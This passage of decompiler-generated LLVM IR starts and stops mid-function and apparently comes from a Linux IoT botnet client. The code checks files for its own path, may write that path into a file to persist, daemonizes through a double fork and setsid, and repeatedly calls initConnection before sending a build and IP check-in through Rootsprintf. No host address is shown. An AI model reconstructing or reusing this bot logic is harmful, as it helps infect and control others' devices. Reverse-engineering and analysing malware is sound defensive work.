  store i1 %v5_804cc88, i1* %cf.global-to-local, align 1
  %tmp182 = bitcast i8** %stack_var_-5888 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_8055aea.165 to i32), i32* %tmp182, align 4
  %v3_804cc93 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_8055aea.165 to i32), i32 ptrtoint (i32* @global_var_8055afd.166 to i32))
  store i32 %v3_804cc93, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cc9e = icmp eq i32 %v3_804cc93, 0
  %v1_804cca2 = icmp eq i1 %v4_804cc9e, false
  br i1 %v1_804cca2, label %dec_label_pc_804ccc1, label %dec_label_pc_804cca4

dec_label_pc_804cca4:                             ; preds = %entry
  store i1 %v5_804cc88, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8055aff.167 to i32), i32* %tmp182, align 4
  %v3_804ccb6 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_8055aff.167 to i32), i32 ptrtoint (i32* @global_var_8055afd.166 to i32))
  store i32 %v3_804ccb6, i32* %eax.global-to-local, align 4
  %v0_804ccbb = load i32, i32* @esp, align 4
  %v2_804ccbb = icmp ugt i32 %v0_804ccbb, -17
  store i1 %v2_804ccbb, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ccc1

dec_label_pc_804ccc1:                             ; preds = %entry, %dec_label_pc_804cca4
  %stack_var_-88.0 = phi i32 [ %v3_804cc93, %entry ], [ %v3_804ccb6, %dec_label_pc_804cca4 ]
  %v3_804ce1113 = phi i32 [ ptrtoint ([19 x i8]* @global_var_8055aea.165 to i32), %entry ], [ ptrtoint ([13 x i8]* @global_var_8055aff.167 to i32), %dec_label_pc_804cca4 ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ccc1 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804ccc1, label %dec_label_pc_804ce68, label %dec_label_pc_804cccb

dec_label_pc_804cccb:                             ; preds = %dec_label_pc_804ccc1
  %v3_804ccd1 = load i32, i32* %v2_804cbd3, align 4
  store i32 %v3_804ccd1, i32* %eax.global-to-local, align 4
  %v1_804ccd4 = inttoptr i32 %v3_804ccd1 to i32*
  %v2_804ccd4 = load i32, i32* %v1_804ccd4, align 4
  %v1_804cce1 = and i32 %v2_804ccd4, -256
  store i32 %v1_804cce1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804cce4 = inttoptr i32 %v2_804ccd4 to i8*
  store i32 %v2_804ccd4, i32* @edi, align 4
  %v3_804ccea = call i32 @_strlen(i8* %v4_804cce4)
  %v0_804ccfb = load i32, i32* @esp, align 4
  %v5_804ccfb = icmp ult i32 %v0_804ccfb, 8
  store i1 %v5_804ccfb, i1* %cf.global-to-local, align 1
  %v2_804cd03 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804cd03, i32* %eax.global-to-local, align 4
  %tmp183 = bitcast i32* %stack_var_-368 to i8*
  store i8* %tmp183, i8** %stack_var_-5888, align 4
  %v3_804cd0a = call i32 @getcwd(i32 %v2_804cd03, i32 256)
  %v0_804cd0f = load i32, i32* @esp, align 4
  %v2_804cd0f = icmp ugt i32 %v0_804cd0f, -17
  store i1 %v2_804cd0f, i1* %cf.global-to-local, align 1
  store i32 %v2_804cd03, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_804cd03, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_8055b0c.168 to i32), i32* @edi, align 4
  %v7_804cd45 = call i32 @_strncmp(i8* %tmp183, i8* bitcast (i8** @global_var_8055b0c.168 to i8*), i32 2)
  %v8_804cd45 = urem i32 %v7_804cd45, 2
  %v9_804cd45 = icmp eq i32 %v8_804cd45, 0
  %v0_804cd47 = load i1, i1* %cf.global-to-local, align 1
  %v2_804cd47 = or i1 %v0_804cd47, %v9_804cd45
  %v3_804cd47 = zext i1 %v2_804cd47 to i32
  %v4_804cd47 = load i32, i32* @edx, align 4
  %v5_804cd47 = and i32 %v4_804cd47, -256
  %v6_804cd47 = or i32 %v3_804cd47, %v5_804cd47
  %v7_804cd47 = xor i32 %v6_804cd47, 1
  store i32 %v7_804cd47, i32* %edx.global-to-local, align 4
  %v5_804cd4a = ptrtoint i32* %stack_var_-512 to i32
  %v3_804cd4d = and i32 %v7_804cd45, -256
  %v1_804cd4f = trunc i32 %v7_804cd47 to i8
  %v3_804cd4f = trunc i32 %v5_804cd4a to i8
  %v4_804cd4f = sub i8 %v1_804cd4f, %v3_804cd4f
  %v15_804cd4f = icmp eq i8 %v4_804cd4f, 0
  %v20_804cd4f = zext i8 %v4_804cd4f to i32
  %v23_804cd4f = or i32 %v20_804cd4f, %v3_804cd4d
  store i32 %v23_804cd4f, i32* @ecx, align 4
  %v2_804cd53 = sext i8 %v4_804cd4f to i32
  store i32 %v2_804cd53, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804cd4f, label %dec_label_pc_804ce5a, label %dec_label_pc_804cd63.preheader

dec_label_pc_804cd63.preheader:                   ; preds = %dec_label_pc_804cccb
  br label %dec_label_pc_804cd63

dec_label_pc_804cd60:                             ; preds = %dec_label_pc_804cd63
  %v4_804cd60 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804cd63

dec_label_pc_804cd63:                             ; preds = %dec_label_pc_804cd63.preheader, %dec_label_pc_804cd60
  %stack_var_-84.0 = phi i32 [ %v4_804cd60, %dec_label_pc_804cd60 ], [ %v3_804ccea, %dec_label_pc_804cd63.preheader ]
  store i32 %v2_804cba9, i32* @esi, align 4
  %v3_804cd69 = load i32, i32* %v2_804cbd3, align 4
  store i32 %v3_804cd69, i32* %eax.global-to-local, align 4
  %v1_804cd6c = inttoptr i32 %v3_804cd69 to i32*
  %v2_804cd6c = load i32, i32* %v1_804cd6c, align 4
  store i32 %v2_804cd6c, i32* %edx.global-to-local, align 4
  %v2_804cd71 = add i32 %v2_804cd6c, %stack_var_-84.0
  store i32 %v2_804cd71, i32* %eax.global-to-local, align 4
  %v1_804cd74 = inttoptr i32 %v2_804cd71 to i8*
  %v2_804cd74 = load i8, i8* %v1_804cd74, align 1
  %v3_804cd74 = zext i8 %v2_804cd74 to i32
  %v5_804cd74 = and i32 %v2_804cd71, -256
  %v6_804cd74 = or i32 %v3_804cd74, %v5_804cd74
  store i32 %v6_804cd74, i32* %eax.global-to-local, align 4
  %v6_804cd76 = icmp ult i8 %v2_804cd74, 47
  store i1 %v6_804cd76, i1* %cf.global-to-local, align 1
  %v10_804cd76 = icmp eq i8 %v2_804cd74, 47
  %v1_804cd78 = icmp eq i1 %v10_804cd76, false
  br i1 %v1_804cd78, label %dec_label_pc_804cd60, label %dec_label_pc_804cd7a

dec_label_pc_804cd7a:                             ; preds = %dec_label_pc_804cd63
  store i32 %v2_804cba9, i32* @edi, align 4
  %v3_804cd80 = load i32, i32* %v2_804cbd3, align 4
  store i32 %v3_804cd80, i32* %eax.global-to-local, align 4
  %v1_804cd83 = inttoptr i32 %v3_804cd80 to i32*
  %v2_804cd83 = load i32, i32* %v1_804cd83, align 4
  store i32 %v2_804cd83, i32* %edx.global-to-local, align 4
  %v2_804cd88 = add i32 %v2_804cd83, %stack_var_-84.0
  store i32 %v2_804cd88, i32* %stack_var_-5876, align 4
  %v2_804cd98 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804cd98, i32* %eax.global-to-local, align 4
  %tmp184 = bitcast i32* %stack_var_-624 to i8*
  store i8* %tmp184, i8** %stack_var_-5888, align 4
  %v5_804cd9f = call i32 @sprintf(i32 %v2_804cd98, i32 ptrtoint ([8 x i8]* @global_var_8055b0e.169 to i32), i32 %v2_804cd03, i32 %v2_804cd88)
  store i32 %v5_804cd9f, i32* %eax.global-to-local, align 4
  %v0_804cda4 = load i32, i32* @esp, align 4
  %v2_804cda4 = icmp ugt i32 %v0_804cda4, -17
  store i1 %v2_804cda4, i1* %cf.global-to-local, align 1
  %v8_804cde6 = inttoptr i32 %stack_var_-88.0 to i8*
  %tmp185 = inttoptr i32 %stack_var_-88.0 to i32*
  %v2_804cdb4 = ptrtoint i32* %stack_var_-1648 to i32
  %tmp186 = bitcast i32* %stack_var_-1648 to i8*
  %v5_804cda9 = icmp ult i32* %stack_var_-5872, inttoptr (i32 4 to i32*)
  br label %dec_label_pc_804cde3.outer

dec_label_pc_804cda9:                             ; preds = %dec_label_pc_804cde3
  store i1 %v5_804cda9, i1* %cf.global-to-local, align 1
  store i32 %v2_804cdb4, i32* %eax.global-to-local, align 4
  store i8* %tmp186, i8** %stack_var_-5888, align 4
  %v4_804cdbb = call i32 @fgets(i32 %v2_804cdb4, i32 1024, i32 %stack_var_-88.0)
  store i1 %v5_804cc88, i1* %cf.global-to-local, align 1
  store i32 %v2_804cdb4, i32* %eax.global-to-local, align 4
  store i8* %tmp186, i8** %stack_var_-5888, align 4
  %v4_804cdd4 = call i32 @__GI_strcasecmp(i8* %tmp186, i32 %v2_804cd98)
  store i32 %v4_804cdd4, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cddc = icmp eq i32 %v4_804cdd4, 0
  %v1_804cdde = icmp eq i1 %v1_804cddc, false
  br i1 %v1_804cdde, label %dec_label_pc_804cde3, label %dec_label_pc_804cde0

dec_label_pc_804cde0:                             ; preds = %dec_label_pc_804cda9
  %v4_804cde0 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804cde3.outer

dec_label_pc_804cde3.outer:                       ; preds = %dec_label_pc_804cde0, %dec_label_pc_804cd7a
  %stack_var_-5880.0 = phi i32 [ %v2_804cd03, %dec_label_pc_804cd7a ], [ %stack_var_-88.0, %dec_label_pc_804cde0 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804cd7a ], [ %v4_804cde0, %dec_label_pc_804cde0 ]
  br label %dec_label_pc_804cde3

dec_label_pc_804cde3:                             ; preds = %dec_label_pc_804cde3.outer, %dec_label_pc_804cda9
  %stack_var_-5880.1 = phi i32 [ %stack_var_-5880.0, %dec_label_pc_804cde3.outer ], [ %stack_var_-88.0, %dec_label_pc_804cda9 ]
  store i1 %v5_804cc39, i1* %cf.global-to-local, align 1
  store i8* %v8_804cde6, i8** %stack_var_-5888, align 4
  %v3_804cde9 = call i32 @feof(i32* %tmp185)
  store i32 %v3_804cde9, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cdf1 = icmp eq i32 %v3_804cde9, 0
  br i1 %v1_804cdf1, label %dec_label_pc_804cda9, label %dec_label_pc_804cdf5

dec_label_pc_804cdf5:                             ; preds = %dec_label_pc_804cde3
  %v4_804cdf5 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804cdf9 = icmp eq i1 %v4_804cdf5, false
  store i1 %v5_804cc39, i1* %cf.global-to-local, align 1
  store i8* %v8_804cde6, i8** %stack_var_-5888, align 4
  %tmp187 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804ce50 = call i32 @__GI_fclose(i16* %tmp187)
  store i32 %v3_804ce50, i32* @eax, align 4
  %v0_804ce55 = load i32, i32* @esp, align 4
  %v2_804ce55 = icmp ugt i32 %v0_804ce55, -17
  store i1 %v2_804ce55, i1* %cf.global-to-local, align 1
  br i1 %v1_804cdf9, label %dec_label_pc_804ce68, label %dec_label_pc_804cdfb

dec_label_pc_804cdfb:                             ; preds = %dec_label_pc_804cdf5
  store i1 %v5_804cc88, i1* %cf.global-to-local, align 1
  store i32 %v3_804ce1113, i32* %tmp182, align 4
  %v3_804ce14 = call i32 @__GI_fopen(i32 %v3_804ce1113, i32 ptrtoint (i32* @global_var_8055b16.170 to i32))
  store i32 %v3_804ce14, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ce1f = icmp eq i32 %v3_804ce14, 0
  br i1 %v4_804ce1f, label %dec_label_pc_804ce68, label %dec_label_pc_804ce25

dec_label_pc_804ce25:                             ; preds = %dec_label_pc_804cdfb
  store i1 %v5_804cc88, i1* %cf.global-to-local, align 1
  store i32 %v2_804cd98, i32* %eax.global-to-local, align 4
  store i8* %tmp184, i8** %stack_var_-5888, align 4
  %v3_804ce32 = call i32 @__GI_fputs(i32 %v2_804cd98, i32 %v3_804ce14)
  store i32 %v3_804ce32, i32* @eax, align 4
  store i1 %v5_804cc39, i1* %cf.global-to-local, align 1
  %v8_804ce3d = inttoptr i32 %v3_804ce14 to i8*
  store i8* %v8_804ce3d, i8** %stack_var_-5888, align 4
  %tmp188 = inttoptr i32 %v3_804ce14 to i16*
  %v3_804ce40 = call i32 @__GI_fclose(i16* %tmp188)
  store i32 %v3_804ce40, i32* %eax.global-to-local, align 4
  %v0_804ce45 = load i32, i32* @esp, align 4
  %v2_804ce45 = icmp ugt i32 %v0_804ce45, -17
  store i1 %v2_804ce45, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ce68

dec_label_pc_804ce5a:                             ; preds = %dec_label_pc_804cccb
  %v0_804ce5a = load i32, i32* @esp, align 4
  %v5_804ce5a = icmp ult i32 %v0_804ce5a, 12
  store i1 %v5_804ce5a, i1* %cf.global-to-local, align 1
  %v8_804ce5d = inttoptr i32 %stack_var_-88.0 to i8*
  store i8* %v8_804ce5d, i8** %stack_var_-5888, align 4
  %tmp189 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804ce60 = call i32 @__GI_fclose(i16* %tmp189)
  store i32 %v3_804ce60, i32* %eax.global-to-local, align 4
  %v0_804ce65 = load i32, i32* @esp, align 4
  %v2_804ce65 = icmp ugt i32 %v0_804ce65, -17
  store i1 %v2_804ce65, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ce68

dec_label_pc_804ce68:                             ; preds = %dec_label_pc_804cdf5, %dec_label_pc_804cdfb, %dec_label_pc_804ccc1, %dec_label_pc_804ce25, %dec_label_pc_804ce5a
  %stack_var_-5880.2 = phi i32 [ %v1_804cbf2, %dec_label_pc_804ccc1 ], [ %v1_804cbf2, %dec_label_pc_804ce5a ], [ %stack_var_-5880.1, %dec_label_pc_804cdf5 ], [ %stack_var_-5880.1, %dec_label_pc_804cdfb ], [ %stack_var_-5880.1, %dec_label_pc_804ce25 ]
  %v0_804ce68 = call i32 @getOurIP()
  store i32 %v0_804ce68, i32* %eax.global-to-local, align 4
  %v0_804ce6d = load i8*, i8** %stack_var_-5888, align 4
  %v1_804ce6d = ptrtoint i8* %v0_804ce6d to i32
  %v2_804ce6d = call i32 @__libc_fork(i32 %v1_804ce6d)
  store i32 %v2_804ce6d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ce75 = icmp eq i32 %v2_804ce6d, 0
  br i1 %v4_804ce75, label %dec_label_pc_804ce9f, label %dec_label_pc_804ced0

dec_label_pc_804ce9f:                             ; preds = %dec_label_pc_804ce68
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804ce9f = load i8*, i8** %stack_var_-5888, align 4
  %v1_804ce9f = ptrtoint i8* %v0_804ce9f to i32
  %v2_804ce9f = call i32 @__libc_fork(i32 %v1_804ce9f)
  store i32 %v2_804ce9f, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cea7 = icmp eq i32 %v2_804ce9f, 0
  br i1 %v4_804cea7, label %dec_label_pc_804ceb7.thread, label %dec_label_pc_804cebd

dec_label_pc_804ceb7.thread:                      ; preds = %dec_label_pc_804ce9f
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cee1

dec_label_pc_804cebd:                             ; preds = %dec_label_pc_804ce9f
  %v0_804cead = load i32, i32* @esp, align 4
  %v5_804cead = icmp ult i32 %v0_804cead, 12
  store i1 %v5_804cead, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804ceb2 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_8055b18.171 to i32), i32* %eax.global-to-local, align 4
  %v0_804cec2 = load i32, i32* @esp, align 4
  %v5_804cec2 = icmp ult i32 %v0_804cec2, 12
  store i1 %v5_804cec2, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8055b18.171, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804cec6 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8055b18.171 to i32))
  store i32 %v2_804cec6, i32* %eax.global-to-local, align 4
  %v0_804cecb = load i32, i32* @esp, align 4
  %v2_804cecb = icmp ugt i32 %v0_804cecb, -17
  store i1 %v2_804cecb, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cee1

dec_label_pc_804ced0:                             ; preds = %dec_label_pc_804ce68
  %v0_804ce7b = load i32, i32* @esp, align 4
  %v5_804ce7b = icmp ult i32 %v0_804ce7b, 4
  store i1 %v5_804ce7b, i1* %cf.global-to-local, align 1
  %v2_804ce80 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_804ce80, i32* %eax.global-to-local, align 4
  %v8_804ce84 = inttoptr i32 %v2_804ce6d to i8*
  store i8* %v8_804ce84, i8** %stack_var_-5888, align 4
  %v4_804ce87 = call i32 @__libc_waitpid(i32 %v2_804ce6d, i32 %v2_804ce80, i32 0)
  store i32 %v4_804ce87, i32* @eax, align 4
  store i1 %v5_804cc39, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804ce94 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_8055b18.171 to i32), i32* %eax.global-to-local, align 4
  %v0_804ced5 = load i32, i32* @esp, align 4
  %v5_804ced5 = icmp ult i32 %v0_804ced5, 12
  store i1 %v5_804ced5, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8055b18.171, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804ced9 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8055b18.171 to i32))
  store i32 %v2_804ced9, i32* %eax.global-to-local, align 4
  %v0_804cede = load i32, i32* @esp, align 4
  %v2_804cede = icmp ugt i32 %v0_804cede, -17
  store i1 %v2_804cede, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cee1

dec_label_pc_804cee1:                             ; preds = %dec_label_pc_804ceb7.thread, %dec_label_pc_804cebd, %dec_label_pc_804ced0
  %stack_var_-5880.3 = phi i32 [ %stack_var_-5880.2, %dec_label_pc_804ceb7.thread ], [ %stack_var_-5880.2, %dec_label_pc_804cebd ], [ 0, %dec_label_pc_804ced0 ]
  %v0_804cee1 = call i32 @__GI_setsid()
  store i32 %v0_804cee1, i32* %eax.global-to-local, align 4
  %v0_804cee6 = load i32, i32* @esp, align 4
  %v5_804cee6 = icmp ult i32 %v0_804cee6, 12
  store i1 %v5_804cee6, i1* %cf.global-to-local, align 1
  store i8* bitcast (i8** @global_var_8055b0c.168 to i8*), i8** %stack_var_-5888, align 4
  %v2_804ceee = call i32 @chdir(i32 ptrtoint (i8** @global_var_8055b0c.168 to i32))
  store i32 %v2_804ceee, i32* %eax.global-to-local, align 4
  store i1 %v5_804cc88, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5888, align 4
  %v3_804cefd = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_804cefd, i32* %eax.global-to-local, align 4
  %v0_804cf02 = load i32, i32* @esp, align 4
  %v2_804cf02 = icmp ugt i32 %v0_804cf02, -17
  store i1 %v2_804cf02, i1* %cf.global-to-local, align 1
  %v2_804d58a = ptrtoint i32* %stack_var_-5744 to i32
  %tmp190 = bitcast i32* %stack_var_-5744 to i8*
  %tmp191 = bitcast i8** %stack_var_-36 to i32*
  %v2_804d541 = ptrtoint i32* %stack_var_-624 to i32
  %v2_804d39b = ptrtoint i32* %stack_var_-1648 to i32
  %v5_804d20e = and i32 %v2_804d58a, -256
  %v1_804d21b = or i32 %v2_804d58a, 1
  %storemerge16210 = inttoptr i32 %v1_804d21b to i8*
  br label %dec_label_pc_804cf07.outer

dec_label_pc_804cf07.outer:                       ; preds = %dec_label_pc_804d1da, %dec_label_pc_804d58a, %dec_label_pc_804cee1
  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_804cee1 ], [ %stack_var_-28.1.ph, %dec_label_pc_804d58a ], [ %stack_var_-28.1.ph, %dec_label_pc_804d1da ]
  %stack_var_-5832.0.ph = phi i32 [ %tmp123, %dec_label_pc_804cee1 ], [ %stack_var_-5832.2.ph27, %dec_label_pc_804d58a ], [ %stack_var_-5832.2.ph27, %dec_label_pc_804d1da ]
  %stack_var_-64.0.ph = phi i8* [ %tmp126, %dec_label_pc_804cee1 ], [ %stack_var_-64.2.ph32, %dec_label_pc_804d58a ], [ %stack_var_-64.2.ph32, %dec_label_pc_804d1da ]
  %stack_var_-60.0.ph36 = phi i32 [ %tmp135, %dec_label_pc_804cee1 ], [ %stack_var_-60.3, %dec_label_pc_804d58a ], [ %stack_var_-60.2, %dec_label_pc_804d1da ]
  %stack_var_-96.0.ph37 = phi i32 [ 0, %dec_label_pc_804cee1 ], [ %stack_var_-96.2.ph34, %dec_label_pc_804d58a ], [ %v4_804d1da, %dec_label_pc_804d1da ]
  %v0_804cf0755 = call i32 @initConnection()
  store i32 %v0_804cf0755, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cf0c56 = icmp eq i32 %v0_804cf0755, 0
  br i1 %v1_804cf0c56, label %dec_label_pc_804cf1f, label %dec_label_pc_804cf10

dec_label_pc_804cf10:                             ; preds = %dec_label_pc_804cf07.outer, %dec_label_pc_804cf10
  %v0_804cf10 = load i32, i32* @esp, align 4
  %v5_804cf10 = icmp ult i32 %v0_804cf10, 12
  store i1 %v5_804cf10, i1* %cf.global-to-local, align 1
  %v1_804cf13 = add i32 %v0_804cf10, -16
  %v2_804cf13 = inttoptr i32 %v1_804cf13 to i32*
  store i32 30, i32* %v2_804cf13, align 4
  %v0_804cf15 = call i32 @sleep()
  store i32 %v0_804cf15, i32* %eax.global-to-local, align 4
  %v0_804cf1a = load i32, i32* @esp, align 4
  %v2_804cf1a = icmp ugt i32 %v0_804cf1a, -17
  store i1 %v2_804cf1a, i1* %cf.global-to-local, align 1
  %v0_804cf07 = call i32 @initConnection()
  store i32 %v0_804cf07, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cf0c = icmp eq i32 %v0_804cf07, 0
  br i1 %v1_804cf0c, label %dec_label_pc_804cf1f, label %dec_label_pc_804cf10

dec_label_pc_804cf1f:                             ; preds = %dec_label_pc_804cf10, %dec_label_pc_804cf07.outer
  %v0_804cf1f = call i32 @getBuild()
  store i32 %v0_804cf1f, i32* %eax.global-to-local, align 4
  store i32 %v0_804cf1f, i32* @ebx, align 4
  %v0_804cf26 = load i32, i32* @esp, align 4
  %v5_804cf26 = icmp ult i32 %v0_804cf26, 12
  store i1 %v5_804cf26, i1* %cf.global-to-local, align 1
  %v0_804cf29 = load i32, i32* @global_var_805e748.40, align 8
  %v2_804cf29 = add i32 %v0_804cf26, -16
  %v3_804cf29 = inttoptr i32 %v2_804cf29 to i32*
  store i32 %v0_804cf29, i32* %v3_804cf29, align 4
  %v0_804cf2f = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cf2f = ptrtoint i8* %v0_804cf2f to i32
  %v2_804cf2f = call i32 @__GI_inet_ntoa(i32 %v1_804cf2f)
  store i32 %v2_804cf2f, i32* %eax.global-to-local, align 4
  %v0_804cf34 = load i32, i32* @esp, align 4
  %v2_804cf34 = icmp ugt i32 %v0_804cf34, -17
  store i1 %v2_804cf34, i1* %cf.global-to-local, align 1
  %v0_804cf37 = load i32, i32* @global_var_80584c0.18, align 64
  store i32 %v0_804cf37, i32* %edx.global-to-local, align 4
  %v0_804cf3d = load i32, i32* @ebx, align 4
  %v2_804cf3d = add i32 %v0_804cf34, 12
  %v3_804cf3d = inttoptr i32 %v2_804cf3d to i32*
  store i32 %v0_804cf3d, i32* %v3_804cf3d, align 4
  %v2_804cf3e = add i32 %v0_804cf34, 8
  %v3_804cf3e = inttoptr i32 %v2_804cf3e to i32*
  store i32 %v2_804cf2f, i32* %v3_804cf3e, align 4
  %v1_804cf3f = add i32 %v0_804cf34, 4
  %v2_804cf3f = inttoptr i32 %v1_804cf3f to i32*
  store i32 ptrtoint (i32* @global_var_8055b28.172 to i32), i32* %v2_804cf3f, align 4
  %v0_804cf44 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cf44 = inttoptr i32 %v0_804cf34 to i32*
  store i32 %v0_804cf44, i32* %v3_804cf44, align 4
  %v0_804cf45 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cf45 = ptrtoint i8* %v0_804cf45 to i32
  %v4_804cf45 = load i32, i32* %stack_var_-5876, align 4
  %v5_804cf45 = load i32, i32* %stack_var_-5872, align 4
  %v7_804cf45 = call i32 @Rootsprintf(i32 %v1_804cf45, i32 1, i32 %stack_var_-5880.3, i32 %v4_804cf45, i32 %v5_804cf45, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_804cf45, i32* %eax.global-to-local, align 4
  %v0_804cf4a = load i32, i32* @esp, align 4
  %v2_804cf4a = icmp ugt i32 %v0_804cf4a, -17
  store i1 %v2_804cf4a, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d58a.outer

dec_label_pc_804cf6c:                             ; preds = %dec_label_pc_804d161, %dec_label_pc_804d115
  %v2_804cf6f = mul i32 %storemerge17, 4
  store i32 %v2_804cf6f, i32* %edx.global-to-local, align 4
  %v0_804cf74 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804cf79 = add i32 %v0_804cf74, %v2_804cf6f
  store i32 %v2_804cf79, i32* %eax.global-to-local, align 4
  %v1_804cf7c = inttoptr i32 %v2_804cf79 to i32*
  %v2_804cf7c = load i32, i32* %v1_804cf7c, align 4
  store i32 %v2_804cf7c, i32* %eax.global-to-local, align 4
  %tmp284 = and i32 %v0_804cf7e.in, -4
  %v5_804cf7e = icmp eq i32 %tmp284, -16
  store i1 %v5_804cf7e, i1* %cf.global-to-local, align 1
  %v1_804cf81 = add i32 %v0_804cf7e.in, 8
  %v2_804cf81 = inttoptr i32 %v1_804cf81 to i32*
  store i32 1, i32* %v2_804cf81, align 4
  %v1_804cf83 = add i32 %v0_804cf7e.in, 4
  %v2_804cf83 = inttoptr i32 %v1_804cf83 to i32*
  store i32 0, i32* %v2_804cf83, align 4
  %v0_804cf85 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cf85 = inttoptr i32 %v0_804cf7e.in to i32*
  store i32 %v0_804cf85, i32* %v3_804cf85, align 4
  %v4_804cf86 = call i32 @__libc_waitpid(i32 %storemerge17, i32 %v2_804cf86, i32 %stack_var_-60.2)
  store i32 %v4_804cf86, i32* %eax.global-to-local, align 4
  %v0_804cf8b = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp192 = icmp slt i32 %v4_804cf86, 1
  %.pre = add i32 %storemerge17, 1
  br i1 %tmp192, label %dec_label_pc_804d112, label %dec_label_pc_804cf96

dec_label_pc_804cf96:                             ; preds = %dec_label_pc_804cf6c
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cfc9

dec_label_pc_804cf9f:                             ; preds = %dec_label_pc_804cfc9, %dec_label_pc_804d003
  %v2_804cfa2 = mul i32 %storemerge19, 4
  %v0_804cfa7 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804cfac = add i32 %v0_804cfa7, %v2_804cfa2
  %v1_804cfaf = add i32 %v2_804cfac, -4
  store i32 %v2_804cfa2, i32* %edx.global-to-local, align 4
  store i32 %v2_804cfac, i32* %eax.global-to-local, align 4
  %v1_804cfc2 = inttoptr i32 %v2_804cfac to i32*
  %v2_804cfc2 = load i32, i32* %v1_804cfc2, align 4
  store i32 %v2_804cfc2, i32* %eax.global-to-local, align 4
  %v2_804cfc4 = inttoptr i32 %v1_804cfaf to i32*
  store i32 %v2_804cfc2, i32* %v2_804cfc4, align 4
  %v4_804cfc6 = add i32 %storemerge19, 1
  br label %dec_label_pc_804cfc9

dec_label_pc_804cfc9:                             ; preds = %dec_label_pc_804cf96, %dec_label_pc_804cf9f
  %storemerge19 = phi i32 [ %v4_804cfc6, %dec_label_pc_804cf9f ], [ %.pre, %dec_label_pc_804cf96 ]
  store i32 %storemerge19, i32* %eax.global-to-local, align 4
  %v0_804cfdd = load i32, i32* @global_var_80584c8.31, align 8
  store i32 %v0_804cfdd, i32* %edx.global-to-local, align 4
  %v0_804cfe3 = load i32, i32* @global_var_80584cc.32, align 4
  %v10_804cffb = icmp eq i32 %v0_804cfe3, 0
  br i1 %v10_804cffb, label %dec_label_pc_804d003, label %dec_label_pc_804cf9f

dec_label_pc_804d003:                             ; preds = %dec_label_pc_804cfc9
  store i32 0, i32* @esi, align 4
  store i32 %v0_804cfdd, i32* @edi, align 4
  %v10_804d017 = icmp ult i32 %storemerge19, %v0_804cfdd
  br i1 %v10_804d017, label %dec_label_pc_804cf9f, label %dec_label_pc_804d01f

dec_label_pc_804d01f:                             ; preds = %dec_label_pc_804d003
  %v2_804d022 = mul i32 %storemerge19, 4
  %v0_804d027 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804d02c = add i32 %v2_804d022, -4
  %v1_804d02f = add i32 %v2_804d02c, %v0_804d027
  %v1_804d032 = inttoptr i32 %v1_804d02f to i32*
  store i32 0, i32* %v1_804d032, align 4
